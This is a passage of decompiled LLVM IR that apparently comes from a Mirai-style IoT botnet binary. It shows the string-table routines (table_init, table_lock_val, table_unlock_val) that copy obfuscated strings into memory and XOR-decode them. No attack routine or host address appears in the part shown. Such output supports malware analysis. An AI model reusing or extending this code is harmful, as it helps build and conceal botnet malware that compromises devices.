  uselistorder i32 10240, { 7, 3, 6, 2, 8, 1, 9, 4, 10, 5, 11, 0, 12 }
  uselistorder i8** @global_var_24358.201, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_24358.201 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @rand_next, { 8, 14, 13, 12, 11, 10, 9, 69, 68, 67, 66, 7, 6, 5, 4, 3, 2, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 1, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* @global_var_26e70.199, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_26e6c.197, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* @global_var_24388.186, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 4, 5, 6, 0, 1, 2, 3, 7, 9, 8 }
  uselistorder i32* @global_var_26e50.101, { 2, 3, 1, 0, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32 ()* @util_local_addr, { 0, 2, 1 }
  uselistorder i32* @global_var_26e74.184, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 2, 3, 5, 4, 1, 0 }
  uselistorder label %bb420, { 1, 0 }
  uselistorder label %dec_label_pc_118e4, { 1, 0 }
  uselistorder label %dec_label_pc_118dc, { 1, 0 }
  uselistorder label %dec_label_pc_1183c, { 1, 0 }
  uselistorder label %dec_label_pc_11664, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11558, { 1, 0 }
  uselistorder label %dec_label_pc_11554, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_1151c, { 1, 0 }
  uselistorder label %dec_label_pc_11518, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11508, { 1, 0 }
  uselistorder label %dec_label_pc_11494, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11460, { 1, 0 }
  uselistorder label %.thread106, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11440, { 1, 0 }
  uselistorder label %dec_label_pc_1142c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_113e8, { 1, 0 }
  uselistorder label %dec_label_pc_113e8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_113a4, { 1, 0 }
  uselistorder label %dec_label_pc_11334, { 7, 4, 5, 6, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11308, { 1, 0 }
  uselistorder label %dec_label_pc_1123c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11224, { 1, 0 }
  uselistorder label %dec_label_pc_11168, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_11150, { 1, 0 }
  uselistorder label %dec_label_pc_11094, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_1107c, { 1, 0 }
  uselistorder label %dec_label_pc_10fc0, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10dcc, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10db4, { 1, 0 }
  uselistorder label %dec_label_pc_10c98, { 6, 7, 3, 1, 0, 2, 4, 5 }
  uselistorder label %bb383, { 1, 0 }
  uselistorder label %bb381, { 1, 0 }
  uselistorder label %dec_label_pc_10c60, { 1, 0 }
  uselistorder label %dec_label_pc_10bf4, { 1, 0 }
  uselistorder label %.thread64, { 1, 0 }
  uselistorder label %dec_label_pc_10ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10b94, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10b8cthread-pre-split.thread514, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10b8cthread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10b94.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10b88.loopexit, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10b70, { 1, 0 }
  uselistorder label %dec_label_pc_10ac4, { 1, 0 }
  uselistorder label %bb377, { 1, 0 }
  uselistorder label %bb375, { 1, 0 }
  uselistorder label %bb373, { 1, 0 }
  uselistorder label %bb371, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_109b8.dec_label_pc_109b8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10994.dec_label_pc_10994_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10988, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10980, { 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 1, 0 }
  uselistorder label %dec_label_pc_10938, { 1, 0 }
  uselistorder label %dec_label_pc_107e8, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_107d4, { 1, 0 }
  uselistorder label %bb368, { 1, 0 }
  uselistorder label %dec_label_pc_10660, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1063c, { 1, 0 }
  uselistorder label %dec_label_pc_10630, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1060c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_105e8, { 1, 0 }
  uselistorder label %bb342, { 1, 0 }
  uselistorder label %dec_label_pc_10594, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_10028, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_26e7c.345 to i32), i32* @r2, align 4
  %v3_1194c = mul i32 %arg1, 8
  %v2_11950 = add i32 %v3_1194c, ptrtoint (i32* @global_var_26e7c.345 to i32)
  store i32 %v2_11950, i32* @r3, align 4
  %v2_11954 = icmp eq i32* %arg2, null
  br i1 %v2_11954, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_1195c4 = inttoptr i32 %v2_11950 to i32*
  %v4_1195c5 = load i32, i32* %v3_1195c4, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_11958 = add i32 %v3_1194c, add (i32 ptrtoint (i32* @global_var_26e7c.345 to i32), i32 4)
  %v3_11958 = inttoptr i32 %v2_11958 to i16*
  %v4_11958 = load i16, i16* %v3_11958, align 4
  %v5_11958 = zext i16 %v4_11958 to i32
  store i32 %v5_11958, i32* @r3, align 4
  %v3_1195c = inttoptr i32 %v2_11950 to i32*
  %v4_1195c = load i32, i32* %v3_1195c, align 4
  store i32 %v5_11958, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_1195c6 = phi i32 [ %v4_1195c5, %.thread ], [ %v4_1195c, %bb ]
  ret i32 %v4_1195c6

; uselistorder directives
  uselistorder i32 %v2_11950, { 1, 0, 2 }
  uselistorder i32 %v3_1194c, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11974 = mul i32 %arg1, 8
  %v2_11978 = add i32 %v3_11974, ptrtoint (i32* @global_var_26e7c.345 to i32)
  %v2_1197c = load i32, i32* @global_var_241b0.348, align 4
  %v1_11980 = add i32 %v3_11974, add (i32 ptrtoint (i32* @global_var_26e7c.345 to i32), i32 4)
  %v2_11980 = inttoptr i32 %v1_11980 to i16*
  %v3_11980 = load i16, i16* %v2_11980, align 4
  %v3_11984 = udiv i32 %v2_1197c, 256
  %v2_11988 = icmp eq i16 %v3_11980, 0
  %v3_1198c = udiv i32 %v2_1197c, 65536
  store i32 %v3_1198c, i32* @r3, align 4
  %v3_11990 = load i32, i32* @r4, align 4
  store i32 %v3_11990, i32* %stack_var_-16, align 4
  %v1_11994 = urem i32 %v3_11984, 256
  store i32 %v1_11994, i32* %r6.global-to-local, align 4
  %v1_11998 = urem i32 %v3_1198c, 256
  store i32 %v1_11998, i32* %r5.global-to-local, align 4
  %v3_1199c = udiv i32 %v2_1197c, 16777216
  store i32 %v3_1199c, i32* %r4.global-to-local, align 4
  %v1_119a0 = urem i32 %v2_1197c, 256
  store i32 %v1_119a0, i32* %lr.global-to-local, align 4
  br i1 %v2_11988, label %dec_label_pc_119fc, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_119ac = inttoptr i32 %v2_11978 to i32*
  br label %dec_label_pc_119ac

dec_label_pc_119ac:                               ; preds = %dec_label_pc_119ac.dec_label_pc_119ac_crit_edge, %dec_label_pc_119a8
  %v0_119b4 = phi i32 [ %v0_119b4.pre, %dec_label_pc_119ac.dec_label_pc_119ac_crit_edge ], [ %v1_119a0, %dec_label_pc_119a8 ]
  %v2_119b8 = phi i32 [ %v1_119f0, %dec_label_pc_119ac.dec_label_pc_119ac_crit_edge ], [ 0, %dec_label_pc_119a8 ]
  %v2_119ac = load i32, i32* %v1_119ac, align 4
  %v2_119b0 = add i32 %v2_119ac, %v2_119b8
  %v3_119b0 = inttoptr i32 %v2_119b0 to i8*
  %v4_119b0 = load i8, i8* %v3_119b0, align 1
  %v6_119b0 = zext i8 %v4_119b0 to i32
  %v2_119b4 = xor i32 %v6_119b0, %v0_119b4
  %v1_119b8 = trunc i32 %v2_119b4 to i8
  store i8 %v1_119b8, i8* %v3_119b0, align 1
  %v2_119bc = load i32, i32* %v1_119ac, align 4
  %v0_119c0 = load i32, i32* @ip, align 4
  %v2_119c0 = add i32 %v0_119c0, %v2_119bc
  %v3_119c0 = inttoptr i32 %v2_119c0 to i8*
  %v4_119c0 = load i8, i8* %v3_119c0, align 1
  %v6_119c0 = zext i8 %v4_119c0 to i32
  %v0_119c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_119c4 = xor i32 %v0_119c4, %v6_119c0
  %v1_119c8 = trunc i32 %v2_119c4 to i8
  store i8 %v1_119c8, i8* %v3_119c0, align 1
  %v2_119cc = load i32, i32* %v1_119ac, align 4
  %v0_119d0 = load i32, i32* @ip, align 4
  %v2_119d0 = add i32 %v0_119d0, %v2_119cc
  %v3_119d0 = inttoptr i32 %v2_119d0 to i8*
  %v4_119d0 = load i8, i8* %v3_119d0, align 1
  %v6_119d0 = zext i8 %v4_119d0 to i32
  %v0_119d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_119d4 = xor i32 %v0_119d4, %v6_119d0
  %v1_119d8 = trunc i32 %v2_119d4 to i8
  store i8 %v1_119d8, i8* %v3_119d0, align 1
  %v2_119dc = load i32, i32* %v1_119ac, align 4
  %v0_119e0 = load i32, i32* @ip, align 4
  %v2_119e0 = add i32 %v0_119e0, %v2_119dc
  %v3_119e0 = inttoptr i32 %v2_119e0 to i8*
  %v4_119e0 = load i8, i8* %v3_119e0, align 1
  %v6_119e0 = zext i8 %v4_119e0 to i32
  %v0_119e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_119e4 = xor i32 %v0_119e4, %v6_119e0
  store i32 %v2_119e4, i32* @r3, align 4
  %v1_119e8 = trunc i32 %v2_119e4 to i8
  store i8 %v1_119e8, i8* %v3_119e0, align 1
  %v3_119ec = load i16, i16* %v2_11980, align 4
  %v4_119ec = zext i16 %v3_119ec to i32
  %v0_119f0 = load i32, i32* @ip, align 4
  %v1_119f0 = add i32 %v0_119f0, 1
  store i32 %v1_119f0, i32* @ip, align 4
  %v8_119f8 = icmp sgt i32 %v4_119ec, %v1_119f0
  br i1 %v8_119f8, label %dec_label_pc_119ac.dec_label_pc_119ac_crit_edge, label %dec_label_pc_119fc.loopexit

dec_label_pc_119ac.dec_label_pc_119ac_crit_edge:  ; preds = %dec_label_pc_119ac
  %v0_119b4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_119ac

dec_label_pc_119fc.loopexit:                      ; preds = %dec_label_pc_119ac
  %v2_119fc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_119fc

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119fc.loopexit, %entry
  %v2_119fc = phi i32 [ %v2_119fc.pre, %dec_label_pc_119fc.loopexit ], [ %v3_11990, %entry ]
  store i32 %v2_119fc, i32* @r4, align 4
  ret i32 %v2_11978

; uselistorder directives
  uselistorder i32 %v1_119f0, { 1, 2, 0 }
  uselistorder i32 %v1_119a0, { 1, 0 }
  uselistorder i32 %v3_1198c, { 1, 0 }
  uselistorder i32 %v2_1197c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_11974, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11a14 = mul i32 %arg1, 8
  %v2_11a18 = add i32 %v3_11a14, ptrtoint (i32* @global_var_26e7c.345 to i32)
  %v2_11a1c = load i32, i32* @global_var_241b0.348, align 4
  %v1_11a20 = add i32 %v3_11a14, add (i32 ptrtoint (i32* @global_var_26e7c.345 to i32), i32 4)
  %v2_11a20 = inttoptr i32 %v1_11a20 to i16*
  %v3_11a20 = load i16, i16* %v2_11a20, align 4
  %v3_11a24 = udiv i32 %v2_11a1c, 256
  store i32 %v3_11a24, i32* @r2, align 4
  %v2_11a28 = icmp eq i16 %v3_11a20, 0
  %v3_11a2c = udiv i32 %v2_11a1c, 65536
  store i32 %v3_11a2c, i32* @r3, align 4
  %v3_11a30 = load i32, i32* @r4, align 4
  store i32 %v3_11a30, i32* %stack_var_-16, align 4
  %v1_11a34 = urem i32 %v3_11a24, 256
  store i32 %v1_11a34, i32* %r6.global-to-local, align 4
  %v1_11a38 = urem i32 %v3_11a2c, 256
  store i32 %v1_11a38, i32* %r5.global-to-local, align 4
  %v3_11a3c = udiv i32 %v2_11a1c, 16777216
  store i32 %v3_11a3c, i32* %r4.global-to-local, align 4
  %v1_11a40 = urem i32 %v2_11a1c, 256
  store i32 %v1_11a40, i32* %lr.global-to-local, align 4
  br i1 %v2_11a28, label %dec_label_pc_11a9c, label %dec_label_pc_11a48

dec_label_pc_11a48:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_11a4c = inttoptr i32 %v2_11a18 to i32*
  br label %dec_label_pc_11a4c

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a4c.dec_label_pc_11a4c_crit_edge, %dec_label_pc_11a48
  %v0_11a54 = phi i32 [ %v0_11a54.pre, %dec_label_pc_11a4c.dec_label_pc_11a4c_crit_edge ], [ %v1_11a40, %dec_label_pc_11a48 ]
  %v2_11a58 = phi i32 [ %v1_11a90, %dec_label_pc_11a4c.dec_label_pc_11a4c_crit_edge ], [ 0, %dec_label_pc_11a48 ]
  %v2_11a4c = load i32, i32* %v1_11a4c, align 4
  %v2_11a50 = add i32 %v2_11a4c, %v2_11a58
  %v3_11a50 = inttoptr i32 %v2_11a50 to i8*
  %v4_11a50 = load i8, i8* %v3_11a50, align 1
  %v6_11a50 = zext i8 %v4_11a50 to i32
  %v2_11a54 = xor i32 %v6_11a50, %v0_11a54
  %v1_11a58 = trunc i32 %v2_11a54 to i8
  store i8 %v1_11a58, i8* %v3_11a50, align 1
  %v2_11a5c = load i32, i32* %v1_11a4c, align 4
  %v0_11a60 = load i32, i32* @ip, align 4
  %v2_11a60 = add i32 %v0_11a60, %v2_11a5c
  %v3_11a60 = inttoptr i32 %v2_11a60 to i8*
  %v4_11a60 = load i8, i8* %v3_11a60, align 1
  %v6_11a60 = zext i8 %v4_11a60 to i32
  %v0_11a64 = load i32, i32* %r6.global-to-local, align 4
  %v2_11a64 = xor i32 %v0_11a64, %v6_11a60
  %v1_11a68 = trunc i32 %v2_11a64 to i8
  store i8 %v1_11a68, i8* %v3_11a60, align 1
  %v2_11a6c = load i32, i32* %v1_11a4c, align 4
  %v0_11a70 = load i32, i32* @ip, align 4
  %v2_11a70 = add i32 %v0_11a70, %v2_11a6c
  %v3_11a70 = inttoptr i32 %v2_11a70 to i8*
  %v4_11a70 = load i8, i8* %v3_11a70, align 1
  %v6_11a70 = zext i8 %v4_11a70 to i32
  %v0_11a74 = load i32, i32* %r5.global-to-local, align 4
  %v2_11a74 = xor i32 %v0_11a74, %v6_11a70
  %v1_11a78 = trunc i32 %v2_11a74 to i8
  store i8 %v1_11a78, i8* %v3_11a70, align 1
  %v2_11a7c = load i32, i32* %v1_11a4c, align 4
  %v0_11a80 = load i32, i32* @ip, align 4
  %v2_11a80 = add i32 %v0_11a80, %v2_11a7c
  %v3_11a80 = inttoptr i32 %v2_11a80 to i8*
  %v4_11a80 = load i8, i8* %v3_11a80, align 1
  %v6_11a80 = zext i8 %v4_11a80 to i32
  %v0_11a84 = load i32, i32* %r4.global-to-local, align 4
  %v2_11a84 = xor i32 %v0_11a84, %v6_11a80
  store i32 %v2_11a84, i32* @r3, align 4
  %v1_11a88 = trunc i32 %v2_11a84 to i8
  store i8 %v1_11a88, i8* %v3_11a80, align 1
  %v3_11a8c = load i16, i16* %v2_11a20, align 4
  %v4_11a8c = zext i16 %v3_11a8c to i32
  store i32 %v4_11a8c, i32* @r2, align 4
  %v0_11a90 = load i32, i32* @ip, align 4
  %v1_11a90 = add i32 %v0_11a90, 1
  store i32 %v1_11a90, i32* @ip, align 4
  %v8_11a98 = icmp sgt i32 %v4_11a8c, %v1_11a90
  br i1 %v8_11a98, label %dec_label_pc_11a4c.dec_label_pc_11a4c_crit_edge, label %dec_label_pc_11a9c.loopexit

dec_label_pc_11a4c.dec_label_pc_11a4c_crit_edge:  ; preds = %dec_label_pc_11a4c
  %v0_11a54.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_11a4c

dec_label_pc_11a9c.loopexit:                      ; preds = %dec_label_pc_11a4c
  %v2_11a9c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11a9c

dec_label_pc_11a9c:                               ; preds = %dec_label_pc_11a9c.loopexit, %entry
  %v2_11a9c = phi i32 [ %v2_11a9c.pre, %dec_label_pc_11a9c.loopexit ], [ %v3_11a30, %entry ]
  store i32 %v2_11a9c, i32* @r4, align 4
  ret i32 %v2_11a18

; uselistorder directives
  uselistorder i32 %v1_11a90, { 1, 2, 0 }
  uselistorder i32 %v1_11a40, { 1, 0 }
  uselistorder i32 %v3_11a2c, { 1, 0 }
  uselistorder i32 %v3_11a24, { 1, 0 }
  uselistorder i32 %v2_11a1c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_11a14, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_11aac = load i32, i32* @r4, align 4
  %v6_11aac = load i32, i32* @r5, align 4
  %v9_11aac = load i32, i32* @r6, align 4
  %v12_11aac = load i32, i32* @r7, align 4
  %v15_11aac = load i32, i32* @r8, align 4
  %v18_11aac = load i32, i32* @sb, align 4
  %v24_11aac = load i32, i32* @fp, align 4
  store i32 20, i32* @r0, align 4
  %v0_11ab8 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_26e7c.345 to i32), i32* @r4, align 4
  store i32 %v0_11ab8, i32* @r5, align 4
  %v4_11acc = call i32 @util_memcpy(i32 %v0_11ab8, i32 ptrtoint ([21 x i8]* @global_var_1b69c.353 to i32), i32 20)
  store i32 2, i32* @r0, align 4
  %v0_11ad8 = load i32, i32* @r5, align 4
  store i32 %v0_11ad8, i32* @global_var_26e94.354, align 4
  store i16 20, i16* bitcast (i32* @global_var_26e98.355 to i16*), align 4
  %v0_11ae0 = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 %v0_11ae0, i32* @r6, align 4
  %v4_11af4 = call i32 @util_memcpy(i32 %v0_11ae0, i32 ptrtoint ([3 x i8]* @global_var_1b6b4.357 to i32), i32 2)
  store i32 23, i32* @r0, align 4
  %v0_11afc = load i32, i32* @r6, align 4
  store i32 %v0_11afc, i32* @global_var_26e9c.358, align 4
  %v0_11b00 = load i32, i32* @r5, align 4
  %v1_11b00 = trunc i32 %v0_11b00 to i16
  store i16 %v1_11b00, i16* bitcast (i32* @global_var_26ea0.359 to i16*), align 4
  %v0_11b04 = call i32 @malloc()
  store i32 %v0_11b04, i32* @r6, align 4
  %v4_11b14 = call i32 @util_memcpy(i32 %v0_11b04, i32 ptrtoint ([24 x i8]* @global_var_1b6b8.361 to i32), i32 23)
  %v0_11b1c = load i32, i32* @r5, align 4
  store i32 %v0_11b1c, i32* @r0, align 4
  store i16 23, i16* bitcast (i32* @global_var_26f10.362 to i16*), align 4
  %v0_11b24 = load i32, i32* @r6, align 4
  store i32 %v0_11b24, i32* @global_var_26f0c.363, align 4
  %v0_11b28 = call i32 @malloc()
  %v0_11b2c = load i32, i32* @r5, align 4
  store i32 %v0_11b28, i32* @r6, align 4
  %v3_11b38 = call i32 @util_memcpy(i32 %v0_11b28, i32 ptrtoint (i32* @global_var_1b6d0.365 to i32), i32 %v0_11b2c)
  store i32 15, i32* @r0, align 4
  %v0_11b40 = load i32, i32* @r6, align 4
  store i32 %v0_11b40, i32* @global_var_26f14.366, align 4
  %v0_11b44 = load i32, i32* @r5, align 4
  %v1_11b44 = trunc i32 %v0_11b44 to i16
  store i16 %v1_11b44, i16* bitcast (i32* @global_var_26f18.367 to i16*), align 4
  %v0_11b48 = call i32 @malloc()
  store i32 %v0_11b48, i32* @r5, align 4
  %v3_11b58 = call i32 @util_memcpy(i32 %v0_11b48, i32 ptrtoint (i32* @global_var_1b6d4.369 to i32), i32 15)
  store i32 29, i32* @r0, align 4
  %v0_11b64 = load i32, i32* @r5, align 4
  store i32 %v0_11b64, i32* @global_var_26e8c.370, align 4
  store i16 15, i16* bitcast (i32* @global_var_26e90.371 to i16*), align 4
  %v0_11b6c = call i32 @malloc()
  store i32 %v0_11b6c, i32* @r5, align 4
  %v3_11b7c = call i32 @util_memcpy(i32 %v0_11b6c, i32 ptrtoint (i32* @global_var_1b6e4.373 to i32), i32 29)
  store i32 7, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_26ea8.374 to i16*), align 4
  %v0_11b8c = load i32, i32* @r5, align 4
  store i32 %v0_11b8c, i32* @global_var_26ea4.375, align 4
  %v0_11b90 = call i32 @malloc()
  store i32 7, i32* @r6, align 4
  store i32 %v0_11b90, i32* @r5, align 4
  %v4_11ba4 = call i32 @util_memcpy(i32 %v0_11b90, i32 ptrtoint ([8 x i8]* @global_var_1b704.377 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_11bac = load i32, i32* @r5, align 4
  store i32 %v0_11bac, i32* @global_var_26eac.378, align 4
  %v0_11bb0 = load i32, i32* @r6, align 4
  %v1_11bb0 = trunc i32 %v0_11bb0 to i16
  store i16 %v1_11bb0, i16* bitcast (i32* @global_var_26eb0.379 to i16*), align 4
  %v0_11bb4 = call i32 @malloc()
  store i32 %v0_11bb4, i32* @r5, align 4
  %v4_11bc4 = call i32 @util_memcpy(i32 %v0_11bb4, i32 ptrtoint ([6 x i8]* @global_var_1b70c.381 to i32), i32 5)
  store i32 11, i32* @r0, align 4
  %v0_11bd0 = load i32, i32* @r5, align 4
  store i32 %v0_11bd0, i32* @global_var_26eb4.382, align 4
  store i16 5, i16* bitcast (i32* @global_var_26eb8.383 to i16*), align 4
  %v0_11bd8 = call i32 @malloc()
  store i32 11, i32* @fp, align 4
  store i32 %v0_11bd8, i32* @r5, align 4
  %v3_11bec = call i32 @util_memcpy(i32 %v0_11bd8, i32 ptrtoint (i32* @global_var_1b714.385 to i32), i32 11)
  store i32 4, i32* @r0, align 4
  %v0_11bf4 = load i32, i32* @r5, align 4
  store i32 %v0_11bf4, i32* @global_var_26ebc.386, align 4
  %v0_11bf8 = load i32, i32* @fp, align 4
  %v1_11bf8 = trunc i32 %v0_11bf8 to i16
  store i16 %v1_11bf8, i16* bitcast (i32* @global_var_26ec0.387 to i16*), align 4
  %v0_11bfc = call i32 @malloc()
  store i32 %v0_11bfc, i32* @r5, align 4
  %v4_11c0c = call i32 @util_memcpy(i32 %v0_11bfc, i32 ptrtoint ([5 x i8]* @global_var_1b720.389 to i32), i32 4)
  %v0_11c14 = load i32, i32* @r6, align 4
  store i32 %v0_11c14, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_26ec8.390 to i16*), align 4
  %v0_11c1c = load i32, i32* @r5, align 4
  store i32 %v0_11c1c, i32* @global_var_26ec4.391, align 4
  %v0_11c20 = call i32 @malloc()
  %v0_11c24 = load i32, i32* @r6, align 4
  store i32 %v0_11c20, i32* @r5, align 4
  %v4_11c30 = call i32 @util_memcpy(i32 %v0_11c20, i32 ptrtoint ([8 x i8]* @global_var_1b728.393 to i32), i32 %v0_11c24)
  store i32 8, i32* @r0, align 4
  %v0_11c38 = load i32, i32* @r5, align 4
  store i32 %v0_11c38, i32* @global_var_26ecc.394, align 4
  %v0_11c3c = load i32, i32* @r6, align 4
  %v1_11c3c = trunc i32 %v0_11c3c to i16
  store i16 %v1_11c3c, i16* bitcast (i32* @global_var_26ed0.395 to i16*), align 4
  %v0_11c40 = call i32 @malloc()
  store i32 8, i32* @sl, align 4
  store i32 %v0_11c40, i32* @r5, align 4
  %v4_11c54 = call i32 @util_memcpy(i32 %v0_11c40, i32 ptrtoint ([9 x i8]* @global_var_1b730.397 to i32), i32 8)
  store i32 13, i32* @r0, align 4
  %v0_11c5c = load i32, i32* @r5, align 4
  store i32 %v0_11c5c, i32* @global_var_26ed4.398, align 4
  %v0_11c60 = load i32, i32* @sl, align 4
  %v1_11c60 = trunc i32 %v0_11c60 to i16
  store i16 %v1_11c60, i16* bitcast (i32* @global_var_26ed8.399 to i16*), align 4
  %v0_11c64 = call i32 @malloc()
  store i32 %v0_11c64, i32* @r5, align 4
  %v3_11c74 = call i32 @util_memcpy(i32 %v0_11c64, i32 ptrtoint (i32* @global_var_1b73c.401 to i32), i32 13)
  store i32 10, i32* @r0, align 4
  store i32 10, i32* @r7, align 4
  %v0_11c84 = load i32, i32* @r5, align 4
  store i32 %v0_11c84, i32* @global_var_26edc.402, align 4
  store i16 13, i16* bitcast (i32* @global_var_26ee0.403 to i16*), align 4
  %v0_11c8c = call i32 @malloc()
  %v0_11c94 = load i32, i32* @r7, align 4
  store i32 %v0_11c8c, i32* @r5, align 4
  %v4_11c9c = call i32 @util_memcpy(i32 %v0_11c8c, i32 ptrtoint ([11 x i8]* @global_var_1b74c.405 to i32), i32 %v0_11c94)
  %v0_11ca0 = load i32, i32* @r7, align 4
  store i32 %v0_11ca0, i32* @r0, align 4
  %v0_11ca4 = load i32, i32* @r5, align 4
  store i32 %v0_11ca4, i32* @global_var_26ee4.406, align 4
  %v1_11ca8 = trunc i32 %v0_11ca0 to i16
  store i16 %v1_11ca8, i16* bitcast (i32* @global_var_26ee8.407 to i16*), align 4
  %v0_11cac = call i32 @malloc()
  %v0_11cb4 = load i32, i32* @r7, align 4
  store i32 %v0_11cac, i32* @r5, align 4
  %v4_11cbc = call i32 @util_memcpy(i32 %v0_11cac, i32 ptrtoint ([11 x i8]* @global_var_1b758.409 to i32), i32 %v0_11cb4)
  store i32 33, i32* @r0, align 4
  %v0_11cc4 = load i32, i32* @r5, align 4
  store i32 %v0_11cc4, i32* @global_var_26eec.410, align 4
  %v0_11cc8 = load i32, i32* @r7, align 4
  %v1_11cc8 = trunc i32 %v0_11cc8 to i16
  store i16 %v1_11cc8, i16* bitcast (i32* @global_var_26ef0.411 to i16*), align 4
  %v0_11ccc = call i32 @malloc()
  store i32 %v0_11ccc, i32* @r5, align 4
  %v3_11cdc = call i32 @util_memcpy(i32 %v0_11ccc, i32 ptrtoint (i32* @global_var_1b764.413 to i32), i32 33)
  %v0_11ce4 = load i32, i32* @sl, align 4
  store i32 %v0_11ce4, i32* @r0, align 4
  store i16 33, i16* bitcast (i32* @global_var_26ef8.414 to i16*), align 4
  %v0_11cec = load i32, i32* @r5, align 4
  store i32 %v0_11cec, i32* @global_var_26ef4.415, align 4
  %v0_11cf0 = call i32 @malloc()
  %v0_11cf8 = load i32, i32* @sl, align 4
  store i32 %v0_11cf0, i32* @r5, align 4
  %v4_11d00 = call i32 @util_memcpy(i32 %v0_11cf0, i32 ptrtoint ([9 x i8]* @global_var_1b788.417 to i32), i32 %v0_11cf8)
  %v0_11d04 = load i32, i32* @fp, align 4
  store i32 %v0_11d04, i32* @r0, align 4
  %v0_11d08 = load i32, i32* @r5, align 4
  store i32 %v0_11d08, i32* @global_var_26efc.418, align 4
  %v0_11d0c = load i32, i32* @sl, align 4
  %v1_11d0c = trunc i32 %v0_11d0c to i16
  store i16 %v1_11d0c, i16* bitcast (i32* @global_var_26f00.419 to i16*), align 4
  %v0_11d10 = call i32 @malloc()
